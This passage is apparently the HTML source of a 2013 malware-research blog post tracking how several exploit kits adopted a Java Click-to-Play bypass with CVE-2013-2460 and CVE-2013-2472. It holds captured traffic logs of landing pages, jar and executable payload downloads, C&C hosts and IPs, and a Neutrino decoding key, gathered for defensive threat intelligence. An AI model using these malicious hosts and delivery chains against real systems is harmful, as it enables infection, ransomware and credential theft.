http://[redacted].info/r007gL_0e2X80Ooo-30N1XG/0C/rt/d0tg2C-0e_l6L0H_NL40C05W/0aDec0A/b5g-04-yuI0i3/KS00i/AE0m/VuD0uHFw0/pRgP0Dy-z80J_Aek0Y_hcr0AhC_80_lWyk13f/It0865-L0O_GKn-0E/1dA0baP00-1EAC0QAs/R0f-4Bq0ZIn-f0X_4n-30otyr-05Y83-0ZxLA/17y/RZ0I/MM60-Ajpo06eml/0gVj_P0Yv3E0MRn/30AF6J0H/9ZU0f/WRI0wAPs11/ttO0CZz_j0leh-i0k1X_l0oDdd_0ah_pC/kC4XSO15ZD.exe?lniV=7decb&amp;amp;h=16200 OK (application/x-dosexec)&amp;nbsp;4a0e95c28b2b5b6259b7b558c3565988----------- Out of Topic : Payload -----------Reveton.C&amp;amp;C Reverse Proxy :Reveton Calling Home2013-09-2464.191.122.10 -&amp;nbsp;21788 | 64.191.0.0/17 | NOC | US | NOCINC.COM | NETWORK OPERATIONS CENTER INC.We can see the call to the Bitcoin Miner (read:&amp;nbsp;Ransomware Puts Your System To Work Mining Bitcoins&amp;nbsp;)The binary is not there anymore since 2013-09-11 (was :&amp;nbsp;2794fd5b64b585df132b4524b82d18c8&amp;nbsp;)--------------------------------------------------&amp;lt;/edit3&amp;gt;&amp;lt;edit4 : 2013-09-24&amp;gt;Neutrino : CVE-2013-2460 + Click2Play bypassIt seems the integration has been far from smooth for the Neutrino coder.The jar is inside the Exploit Kit since more than 3 days. The coder announced the new exploit 2 days ago...but the warning was still here and even validating the execution your were safe. Some protections were removed (you could hit the exploit kit as many time as you want with same IP without problem...seems like someone else was testing it :) ). And the 22 (sunday) more than half a day with all threads in 404...But in the end...he made it.CVE-2013-2460 + Click2Play ByPass in Neutrino2013-09-24Will only keep relevant calls :GET http://[redacted].dyndns .info:8000/gxstfkhf?ttdwjipi=4128154200 OK (text/html)GET http://ajax.googleapis .com/ajax/libs/jquery/1.9.1/jquery.min.js200 OK (text/javascript)GET http://[redacted].dyndns .info:8000/index.js200 OK (application/x-javascript)POST http://[redacted].dyndns .info:8000/twpnnurhbg200 OK (text/html)Encoded JnlpApplying the Neutrino &quot;xor&quot; function with key &quot;qoxacfix&quot;JnlpBase64 decode of the jnlp_embedded value :GET http://[redacted].dyndns .info:8000/rclmrcfdvdjtq?joiihv=uihuzdhhuq200 OK (application/java-archive)&amp;nbsp;GET http://[redacted].dyndns .info:8000/rclmrcfdvdjtq?joiihv=uihuzdhhuq200 OK (application/java-archive)&amp;nbsp;3fcac6c64ce0ca28ee615a8fad224dd3Piece of slightly obfuscated CVE-2013-2460 in Neutrino(since 2013-09-21 in fact)GET http://[redacted].dyndns .info:8000/faybcc?juzickeew=uihuzdhhuq200 OK (application/octet-stream) Decoded :&amp;nbsp;a126281477c856b9358de5aea1369990&amp;nbsp;who drop &amp;nbsp;:&amp;nbsp;898b9aee9931230ef3bc0c59eb541c55&amp;nbsp;- Didn&#39;t spend too much time to figure out what it is.Saw 404 POST to : http://allewnuado .ru/perl/config.php - &amp;nbsp;79.174.64.12747385 | 79.174.64.0/19 | HOSTING-COMPANY | RU | HC.RU | HOSTING CENTER LTD.&amp;lt;/edit4&amp;gt;&amp;lt;edit5 2013-09-25&amp;gt;Blackhole : CVE-2013-2460 Click2Play BypassI saw that jar yesterday already being pushed without exploitation to jre7u21 in /closest/ Blackhole.It&#39;s the exact same jar as the Cool EK in &quot;/index.php?p=&quot; that introduce the Bypass.Today on the /Home/ (aka q.php)&amp;nbsp;Darkleech fuelled&amp;nbsp;BH EK the Click2Play bypass is here.And payload is as always Pony (steal passwords and act as loader. No change since at least December. It pushes Urausy in some countries or Nymaim in other countries (which can then get another version of Nymaim with locker functionnality or Zaccess).This has been well explained by Eset.BH EK /Home/ aka q.php CVE-2013-2460 + Click2play bypass2013-09-25GET http://64.246.3 .59/e354340618f9c3a8d474225ef7cc6b2a/panic-portable.php200 OK (text/html)Conditions for the bypass calljnlp callGET http://64.246.3 .59/e354340618f9c3a8d474225ef7cc6b2a/panic-portable.php?!0M!6J=1F_*H4z-I*!f&amp;amp;Jk__*zFA_92-*=7*K9_Kp1200 OK (application/java-archive)GET http://64.246.3 .59/e354340618f9c3a8d474225ef7cc6b2a/panic-portable.php?!0M!6J=1F_*H4z-I*!f&amp;amp;Jk__*zFA_92-*=7*K9_Kp1200 OK (application/java-archive)&amp;nbsp;f5fc4540e6e64efee8711007ac0d4ed1CVE-2013-2460 in BH EK2013-09-25GET http://64.246.3 .59/e354340618f9c3a8d474225ef7cc6b2a/panic-portable.php?-*Z73922k0NUj8=8b8cwd8aww&amp;amp;*F21!gX=w88c8dw6wdw7wbwbwd8c&amp;amp;!_239!6W25u*_=ww&amp;amp;59*!a34-d1_2!uT=u*g88*8&amp;amp;OF2EFwol0!3_9=7ZF!Y*08*!P_75m200 OK (application/x-msdownload) -&amp;nbsp;acb80f0eaa177953a53f3be188c8e3da&amp;nbsp;&amp;nbsp;Analysis and sample:&amp;nbsp;Malwr.com&amp;lt;/edit5&amp;gt;&amp;lt;edit6 2013-10-14&amp;gt;Kore : &amp;nbsp;CVE-2013-2460(Thanks to&amp;nbsp;Timo Hirvonen&amp;nbsp;for confirmation)CVE-2013-2460 (?) and Click2play Bypass in Kore 2013-10-14Pushing Urausy ObviouslyGET http://zanol.muabannhadatdothi .com:90/web.html200 OK (text/html)Piece of Kore Landing.Not what i would call a precision Strike !GET http://zanol.muabannhadatdothi .com:90/jquery.js200 OK (application/javascript)GET http://zanol.muabannhadatdothi .com:90/web.html2.zip200 OK (application/octet-stream)GET http://zanol.muabannhadatdothi .com:90/web.html2.zip200 OK (application/octet-stream)GET http://zanol.muabannhadatdothi .com:90/web.html2.zip200 OK (application/octet-stream)GET http://zanol.muabannhadatdothi .com:90/web.html2.zip200 OK (application/octet-stream)GET http://zanol.muabannhadatdothi .com/web.html?id=2&amp;amp;text=1164200 OK (text/html) (call back)&amp;lt;/edit6&amp;gt;&amp;lt;edit7 2013-10-26&amp;gt;Magnitude : CVE-2013-2463 + C2P bypassIt&#39;s inside Magnitude (popads) since at least 2013-10-19See : Magnitude EK : Pop Pop !&amp;lt;/edit7&amp;gt;&amp;lt;edit8 2013-10-31&amp;gt;Sweet Orange : CVE-2013-2460 + C2P Bypass:Seems to be inside since few days.Thanks to&amp;nbsp;Timo Hirvonen&amp;nbsp;from F-Secure for naming that CVE. Thanks to&amp;nbsp;Chris Wakelin&amp;nbsp;for additionnal help on this.Sweet Orange 2013-10-31CVE-2013-2460 + Click2play bypass successful passGET http://8c10d9c992f1064f.dyndns-remote .com/voip/ports.php?tracetabs=43200 OK (text/html)Piece of Landing after deobfuscation showing the jnlp.GET http://8c10d9c992f1064f.dyndns-remote .com/voip/gBSlO200 OK (application/x-java-archive)&amp;nbsp;87c775be2b9519dd97a0b84da3e3b9b1&amp;nbsp; CVE-2013-2460 insideGET http://8c10d9c992f1064f.dyndns-remote .com/voip/gBSlO200 OK (application/x-java-archive)GET http://8c10d9c992f1064f.dyndns-remote .com/voip/IWcaNgp200 OK (application/x-java-archive)GET http://8c10d9c992f1064f.dyndns-remote .com/voip/OBTjZPq200 OK (application/x-java-archive)GET http://8c10d9c992f1064f.dyndns-remote .com/spanish.php?edit=269&amp;amp;main=4&amp;amp;comp=158&amp;amp;question=171&amp;amp;press=416&amp;amp;staff=385&amp;amp;lang=265&amp;amp;media=552&amp;amp;entry=160&amp;amp;affiliate=156&amp;nbsp;bc57bdf43e0e2d0efe2d0c0e06cddd9d200 OK (application/octet-stream)Files :&amp;nbsp;2 fiddler here&amp;nbsp;(owncloud via goo.gl)&amp;lt;/edit8&amp;gt;">
+	<meta property="og:url" content="http://malware2.dontneedcoffee.com/2013/09/jre7u21-and-earlier-click-2-play.html">
+	<meta property="og:locale" content="en_EN">
+	<meta property="og:type" content="website">
+	<meta property="og:site_name" content="MDNC | Malware don't need Coffee">
+	
+	
+
+
+	
+	<!-- Twitter -->
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:site" content="Kafeine">
+	<meta name="twitter:creator" content="Kafeine">
+	<meta name="twitter:title" content="jre7u21 and earlier Click-2-Play Warning Bypass integrating Exploit Kits">
+	<meta name="twitter:description" content="A new variant of a &quot;Kore-ish&quot; Cool EK appeared few days ago.Yes...it&#39;s difficult to follow the EK fast moving landscape...No payload in the jar for that one.Some instances of this &quot;Cool EK&quot;&amp;nbsp;in URLQueryI faced it often where I used to see Kore (aka Sibhost) Exploit Kit.It is also used to spread the Urausy Ransomware and FakeAV (so... BestAV stuff)All jar found there were identical as those in Blackhole. Till today.CVE-2013-2460 + Click2Play Bypass :That CVE was already in use in&amp;nbsp;Private Exploit Pack&amp;nbsp;but it was noisy (Imposition then made it optional )CVE-2013-2460 successfull path in Cool EK (Kore-ish)Click2Play Bypass inside 2013-09-20GET http://[redacted].tacogratis .com/index.php?p=5267200 OK (text/html)Key Piece of the landingGET http://[redacted].tacogratis .com/index.php?p=5290200 OK (text/javascript)GET http://[redacted].tacogratis .com/index.php?p=5268&amp;nbsp;fb1decbef1c4361eb421a3496201ef30200 OK (application/java-archive)GET http://[redacted].tacogratis .com/index.php?p=5268200 OK (application/java-archive)GET http://cghtuj.tacogratis .com/index.php?p=5275&amp;amp;e=14200 OK (application/x-msdownload) &amp;nbsp;170896de44d75651bbbd9358b0f11c34&amp;nbsp;(Urausy Ransomware)----- Off Topic ----Payload is rotating fast (2 more md5) :b56348220f83ad9db50cb5beb564148b64ef8f2cb215af4b2fbcb51cadfcc025Urauy Ransomware - DE design - 2013-09-20(BestAV soft 2)Note : on another thread you can get &amp;nbsp;a FakeAVPayload call with bigger charge9d8d3094849f685859945140721aafb17fb9423c4bdf7080137745e81ba3836213e24b552ea472146495ac8a33cca975Other payload from this &quot;Kore-ish&quot; Cool EK(BestAV Soft1)-------------------So what&#39;s that &amp;nbsp;Click2Play bypass ?Quite surely :&amp;nbsp;http://seclists.org/bugtraq/2013/Jul/412013-06-18 - Vulnerability Fixed in Java 7u25Yes :Warning with jre7u25(and as CVE-2013-2460 is patch too...clicking on run there won&#39;t put you at risk)It&#39;s the first time I see that.5 days ago :EKs vs jre7u21 : http://t.co/jCkdtnp7NW— kafeine (@kafeine) September 15, 2013 Who sold it ???No download link for now. Yes it will spread fast anyway.It&#39;s easy to get rid of all these Exploit Kits : update !&amp;lt;edit1 2013-09-21&amp;gt;Already in Sakura...surely cause of that blog post. It&#39;s often difficult to decide how much you can write about something.Sakura CVE-2013-2460 &amp;amp; Click2Play Bypass :Sakura featuring CVE-2013-2460 &amp;amp; Click2Play bypass2013-09-21GET http://[redacted]253 .pw:8509/me.php200 OK (text/html)Precision Strikenew Click2Play bypass for 21 versionJnlp callGET http://[redacted]&amp;nbsp;.pw:8509/[redacted].ee200 OK (application/java-archive)&amp;nbsp;dca89d839abbb8f621a87de94d20d8f2&amp;nbsp;CVE-2013-2460Piece of CVE-2013-2460 in Sakura Jar 2013-09-21&amp;nbsp;GET http://[redacted]&amp;nbsp;.pw:8509/bodystarswild.ee200 OK (application/java-archive)GET http://[redacted] .pw:8509/2889.ld200 OK (application/octet-stream) Once decoded : 5fba8226303967ccfd27ea8710a8b99d I think it&#39;s a Smokebot----- Off Topic ----C&amp;amp;C Calls :mexstat757.com POST /satep757/index.phpmexstat220.pw GET /setex/sev57.exe&amp;nbsp;mexstat220.pw &amp;nbsp;GET &amp;nbsp;/setex/pm555.exeetc...46.165.201.27&amp;nbsp;16265 | 46.165.192.0/18 | LEASEWEB | DE | LEASEWEB.COM | LEASEWEB GERMANY GMBHIt&#39;s the same guys than those who were behind this one year old post :From Sakura to Reveton via Smoke Bot - Or a Botnet Distribution of Reveton&amp;nbsp;&amp;nbsp;2012-09-12Since then Smoke Bot is now encrypting its network calls.Analysis by&amp;nbsp;Joe Sandbox Cloud----------------------&amp;nbsp;&amp;lt;/edit1&amp;gt;&amp;lt;edit2: 2013-09-23&amp;gt;Nuclear Pack : CVE-2013-2460 + Click2Play bypassAnnounced Underground :&quot;добавлен новы exploit, пробив увеличен. работает тихо и не палится&quot; &amp;nbsp;Nuclearwhich means something like:&quot;New exploit added, breaking rate increased, works silently and scorched&quot;CVE-2013-2460 with no security prompt successful path in Nuclear Pack2013-09-23GET http://[redacted].flogdoyfohoqobl .biz:12421/3dfa4ffa555573ba6fbb54a243289806/4/5b1bb46b5a96bee3ebbb1d2251d968bb.html200 OK (text/html)Precision Strike&amp;nbsp;&amp;nbsp;(Thanks&amp;nbsp;@EKWatcher&amp;nbsp;)jnlp call in Nuclear PackAfter Deobfuscation (Thanks&amp;nbsp;@EKWatcher&amp;nbsp;)GET http://[redacted].flogdoyfohoqobl .biz:12421/b26c7ee3934bb471d1e1a7e4072dc6ef/1379924555/ba365f21b8ebcfe78ba8a843b76c2d06.jar200 OK (application/java)GET http://[redacted].flogdoyfohoqobl .biz:12421/b26c7ee3934bb471d1e1a7e4072dc6ef/1379924555/ba365f21b8ebcfe78ba8a843b76c2d06.jar200 OK (application/java)&amp;nbsp;e03455403f226b23be42b30733a26101Piece of CVE-2013-2460 in Nuclear Pack 2013-09-23GET http://[redacted].flogdoyfohoqobl .biz:12421/f/1379924555/ba365f21b8ebcfe78ba8a843b76c2d06/b26c7ee3934bb471d1e1a7e4072dc6ef/2200 OK (application/octet-stream) Decoded :&amp;nbsp;3a9d1dcad1176717711eb92b25f7d6b0GET http://[redacted].flogdoyfohoqobl .biz:12421/f/1379924555/ba365f21b8ebcfe78ba8a843b76c2d06/b26c7ee3934bb471d1e1a7e4072dc6ef/2/2200 OK (application/octet-stream)----------- Out of Topic -----------C&amp;amp;C :185.6.80.125 -&amp;nbsp;61422 | 185.6.80.0/24 | TD-VITA | RU | - | TD-VITA LLC.for instance :POST /mBj7cjhH/gate.php HTTP/1.1Content-Type: application/x-www-form-urlencodedConnection: closeUser-Agent: Mozilla/4.0Host: halifaxkilo.comAnalysis&amp;nbsp;by&amp;nbsp;Joe Sandbox Cloud------------------------------------&amp;lt;/edit2&amp;gt;&amp;lt;edit3&amp;gt;Styx CVE-2013-2472 + Click2Play Bypass :Many Thanks to Timo Hirvonen from F-Secure for identifying the CVE.Styx Java exploit mentioned by @kafeine in his blog exploits CVE-2013-2472. This is the first time we see it exploited by cyber criminals— Timo Hirvonen (@TimoHirvonen) September 24, 2013 Reveton Pushed in Styx 2013-09-24Using CVE-2013-2472 &amp;amp; Click2Play Bypass on jre7u21We can see the call for Bitcoin miner after VM Reboot.GET http://[redacted].info/hsZv/3J17_DtR/13C_ht11nF-E17H_R60kufr_0HUzD0c/xrB/055RR0/iWsU0-VEw-x0Rm-ou0xvC-3/302 Found to http://an-wis.info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/GET http://[redacted].info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/200 OK (text/html)GET http://[redacted].info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/yavirts.html200 OK (text/html)GET http://[redacted].info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/jplay.html200 OK (text/html) (jnlp call)Click2Play Bypass in Styx 2013-09-24GET http://[redacted].info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/NyJjQvjE.jar200 OK (application/java-archive)GET http://[redacted].info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/NyJjQvjE.jar200 OK (application/java-archive)&amp;nbsp;3c812730758b9118ba4764adf3ab53bcGET http://[redacted].info/r007gL_0e2X80Ooo-30N1XG/0C/rt/d0tg2C-0e_l6L0H_NL40C05W/0aDec0A/b5g-04-yuI0i3/KS00i/AE0m/VuD0uHFw0/pRgP0Dy-z80J_Aek0Y_hcr0AhC_80_lWyk13f/It0865-L0O_GKn-0E/1dA0baP00-1EAC0QAs/R0f-4Bq0ZIn-f0X_4n-30otyr-05Y83-0ZxLA/17y/RZ0I/MM60-Ajpo06eml/0gVj_P0Yv3E0MRn/30AF6J0H/9ZU0f/WRI0wAPs11/ttO0CZz_j0leh-i0k1X_l0oDdd_0ah_pC/kC4XSO15ZD.exe?lniV=7decb&amp;amp;h=16200 OK (application/x-dosexec)&amp;nbsp;4a0e95c28b2b5b6259b7b558c3565988----------- Out of Topic : Payload -----------Reveton.C&amp;amp;C Reverse Proxy :Reveton Calling Home2013-09-2464.191.122.10 -&amp;nbsp;21788 | 64.191.0.0/17 | NOC | US | NOCINC.COM | NETWORK OPERATIONS CENTER INC.We can see the call to the Bitcoin Miner (read:&amp;nbsp;Ransomware Puts Your System To Work Mining Bitcoins&amp;nbsp;)The binary is not there anymore since 2013-09-11 (was :&amp;nbsp;2794fd5b64b585df132b4524b82d18c8&amp;nbsp;)--------------------------------------------------&amp;lt;/edit3&amp;gt;&amp;lt;edit4 : 2013-09-24&amp;gt;Neutrino : CVE-2013-2460 + Click2Play bypassIt seems the integration has been far from smooth for the Neutrino coder.The jar is inside the Exploit Kit since more than 3 days. The coder announced the new exploit 2 days ago...but the warning was still here and even validating the execution your were safe. Some protections were removed (you could hit the exploit kit as many time as you want with same IP without problem...seems like someone else was testing it :) ). And the 22 (sunday) more than half a day with all threads in 404...But in the end...he made it.CVE-2013-2460 + Click2Play ByPass in Neutrino2013-09-24Will only keep relevant calls :GET http://[redacted].dyndns .info:8000/gxstfkhf?ttdwjipi=4128154200 OK (text/html)GET http://ajax.googleapis .com/ajax/libs/jquery/1.9.1/jquery.min.js200 OK (text/javascript)GET http://[redacted].dyndns .info:8000/index.js200 OK (application/x-javascript)POST http://[redacted].dyndns .info:8000/twpnnurhbg200 OK (text/html)Encoded JnlpApplying the Neutrino &quot;xor&quot; function with key &quot;qoxacfix&quot;JnlpBase64 decode of the jnlp_embedded value :GET http://[redacted].dyndns .info:8000/rclmrcfdvdjtq?joiihv=uihuzdhhuq200 OK (application/java-archive)&amp;nbsp;GET http://[redacted].dyndns .info:8000/rclmrcfdvdjtq?joiihv=uihuzdhhuq200 OK (application/java-archive)&amp;nbsp;3fcac6c64ce0ca28ee615a8fad224dd3Piece of slightly obfuscated CVE-2013-2460 in Neutrino(since 2013-09-21 in fact)GET http://[redacted].dyndns .info:8000/faybcc?juzickeew=uihuzdhhuq200 OK (application/octet-stream) Decoded :&amp;nbsp;a126281477c856b9358de5aea1369990&amp;nbsp;who drop &amp;nbsp;:&amp;nbsp;898b9aee9931230ef3bc0c59eb541c55&amp;nbsp;- Didn&#39;t spend too much time to figure out what it is.Saw 404 POST to : http://allewnuado .ru/perl/config.php - &amp;nbsp;79.174.64.12747385 | 79.174.64.0/19 | HOSTING-COMPANY | RU | HC.RU | HOSTING CENTER LTD.&amp;lt;/edit4&amp;gt;&amp;lt;edit5 2013-09-25&amp;gt;Blackhole : CVE-2013-2460 Click2Play BypassI saw that jar yesterday already being pushed without exploitation to jre7u21 in /closest/ Blackhole.It&#39;s the exact same jar as the Cool EK in &quot;/index.php?p=&quot; that introduce the Bypass.Today on the /Home/ (aka q.php)&amp;nbsp;Darkleech fuelled&amp;nbsp;BH EK the Click2Play bypass is here.And payload is as always Pony (steal passwords and act as loader. No change since at least December. It pushes Urausy in some countries or Nymaim in other countries (which can then get another version of Nymaim with locker functionnality or Zaccess).This has been well explained by Eset.BH EK /Home/ aka q.php CVE-2013-2460 + Click2play bypass2013-09-25GET http://64.246.3 .59/e354340618f9c3a8d474225ef7cc6b2a/panic-portable.php200 OK (text/html)Conditions for the bypass calljnlp callGET http://64.246.3 .59/e354340618f9c3a8d474225ef7cc6b2a/panic-portable.php?!0M!6J=1F_*H4z-I*!f&amp;amp;Jk__*zFA_92-*=7*K9_Kp1200 OK (application/java-archive)GET http://64.246.3 .59/e354340618f9c3a8d474225ef7cc6b2a/panic-portable.php?!0M!6J=1F_*H4z-I*!f&amp;amp;Jk__*zFA_92-*=7*K9_Kp1200 OK (application/java-archive)&amp;nbsp;f5fc4540e6e64efee8711007ac0d4ed1CVE-2013-2460 in BH EK2013-09-25GET http://64.246.3 .59/e354340618f9c3a8d474225ef7cc6b2a/panic-portable.php?-*Z73922k0NUj8=8b8cwd8aww&amp;amp;*F21!gX=w88c8dw6wdw7wbwbwd8c&amp;amp;!_239!6W25u*_=ww&amp;amp;59*!a34-d1_2!uT=u*g88*8&amp;amp;OF2EFwol0!3_9=7ZF!Y*08*!P_75m200 OK (application/x-msdownload) -&amp;nbsp;acb80f0eaa177953a53f3be188c8e3da&amp;nbsp;&amp;nbsp;Analysis and sample:&amp;nbsp;Malwr.com&amp;lt;/edit5&amp;gt;&amp;lt;edit6 2013-10-14&amp;gt;Kore : &amp;nbsp;CVE-2013-2460(Thanks to&amp;nbsp;Timo Hirvonen&amp;nbsp;for confirmation)CVE-2013-2460 (?) and Click2play Bypass in Kore 2013-10-14Pushing Urausy ObviouslyGET http://zanol.muabannhadatdothi .com:90/web.html200 OK (text/html)Piece of Kore Landing.Not what i would call a precision Strike !GET http://zanol.muabannhadatdothi .com:90/jquery.js200 OK (application/javascript)GET http://zanol.muabannhadatdothi .com:90/web.html2.zip200 OK (application/octet-stream)GET http://zanol.muabannhadatdothi .com:90/web.html2.zip200 OK (application/octet-stream)GET http://zanol.muabannhadatdothi .com:90/web.html2.zip200 OK (application/octet-stream)GET http://zanol.muabannhadatdothi .com:90/web.html2.zip200 OK (application/octet-stream)GET http://zanol.muabannhadatdothi .com/web.html?id=2&amp;amp;text=1164200 OK (text/html) (call back)&amp;lt;/edit6&amp;gt;&amp;lt;edit7 2013-10-26&amp;gt;Magnitude : CVE-2013-2463 + C2P bypassIt&#39;s inside Magnitude (popads) since at least 2013-10-19See : Magnitude EK : Pop Pop !&amp;lt;/edit7&amp;gt;&amp;lt;edit8 2013-10-31&amp;gt;Sweet Orange : CVE-2013-2460 + C2P Bypass:Seems to be inside since few days.Thanks to&amp;nbsp;Timo Hirvonen&amp;nbsp;from F-Secure for naming that CVE. Thanks to&amp;nbsp;Chris Wakelin&amp;nbsp;for additionnal help on this.Sweet Orange 2013-10-31CVE-2013-2460 + Click2play bypass successful passGET http://8c10d9c992f1064f.dyndns-remote .com/voip/ports.php?tracetabs=43200 OK (text/html)Piece of Landing after deobfuscation showing the jnlp.GET http://8c10d9c992f1064f.dyndns-remote .com/voip/gBSlO200 OK (application/x-java-archive)&amp;nbsp;87c775be2b9519dd97a0b84da3e3b9b1&amp;nbsp; CVE-2013-2460 insideGET http://8c10d9c992f1064f.dyndns-remote .com/voip/gBSlO200 OK (application/x-java-archive)GET http://8c10d9c992f1064f.dyndns-remote .com/voip/IWcaNgp200 OK (application/x-java-archive)GET http://8c10d9c992f1064f.dyndns-remote .com/voip/OBTjZPq200 OK (application/x-java-archive)GET http://8c10d9c992f1064f.dyndns-remote .com/spanish.php?edit=269&amp;amp;main=4&amp;amp;comp=158&amp;amp;question=171&amp;amp;press=416&amp;amp;staff=385&amp;amp;lang=265&amp;amp;media=552&amp;amp;entry=160&amp;amp;affiliate=156&amp;nbsp;bc57bdf43e0e2d0efe2d0c0e06cddd9d200 OK (application/octet-stream)Files :&amp;nbsp;2 fiddler here&amp;nbsp;(owncloud via goo.gl)&amp;lt;/edit8&amp;gt;">
+	
+	
+
+	<link type="text/plain" rel="author" href="http://malware2.dontneedcoffee.com/humans.txt">
+
+	
+
+	
+
+	<link rel="icon" sizes="32x32" href="http://malware2.dontneedcoffee.com/assets/img/favicon-32x32.png">
+
+	<link rel="icon" sizes="192x192" href="http://malware2.dontneedcoffee.com/assets/img/touch-icon-192x192.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="180x180" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-180x180-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="152x152" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-152x152-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-144x144-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="120x120" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-120x120-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="114x114" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-114x114-precomposed.png">
+
+	
+	<link rel="apple-touch-icon-precomposed" sizes="76x76" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-76x76-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="72x72" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-72x72-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" href="http://malware2.dontneedcoffee.com/assets/img/apple-touch-icon-precomposed.png">	
+
+	<meta name="msapplication-TileImage" content="http://malware2.dontneedcoffee.com/assets/img/msapplication_tileimage.png">
+
+	<meta name="msapplication-TileColor" content="#fabb00">
+
+
+	
+
+</head>
+<body id="top-of-page" class="post">
+	
+	<div id="navigation" class="sticky">
+  <nav class="top-bar" role="navigation" data-topbar>
+    <ul class="title-area">
+      <li class="name">
+      <h1 class="show-for-small-only"><a href="http://malware2.dontneedcoffee.com" class="icon-tree"> MDNC | Malware don't need Coffee</a></h1>
+    </li>
+       <!-- Remove the class "menu-icon" to get rid of menu icon. Take out "Menu" to just have icon alone -->
+      <li class="toggle-topbar menu-icon"><a href="#"><span>Navigation</span></a></li>
+    </ul>
+    <section class="top-bar-section">
+
+      <ul class="right">
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+            
+            
+              <li class="divider"></li>
+              <li><a href="http://malware2.dontneedcoffee.com/search/">Search</a></li>
+
+            
+            
+          
+        
+
+              
+
+          
+          
+            
+            
+              <li class="divider"></li>
+              <li><a href="http://malware2.dontneedcoffee.com/contact/">Contact</a></li>
+
+            
+            
+          
+        
+        
+      </ul>
+
+      <ul class="left">
+        
+
+              
+
+          
+          
+
+            
+            
+              <li><a href="http://malware2.dontneedcoffee.com/">Home</a></li>
+              <li class="divider"></li>
+
+            
+            
+          
+        
+
+              
+
+          
+          
+
+            
+            
+
+              <li class="has-dropdown">
+                <a href="http://malware2.dontneedcoffee.com/blog/">Blog</a>
+
+                  <ul class="dropdown">
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/blog/external/">External Blog</a></li>
+                    
+
+                      
+
+                      <li><a href="http://malware2.dontneedcoffee.com/blog/archive/">Blog Archive</a></li>
+                    
+                  </ul>
+
+              </li>
+              <li class="divider"></li>
+            
+          
+        
+
+              
+
+          
+          
+
+            
+            
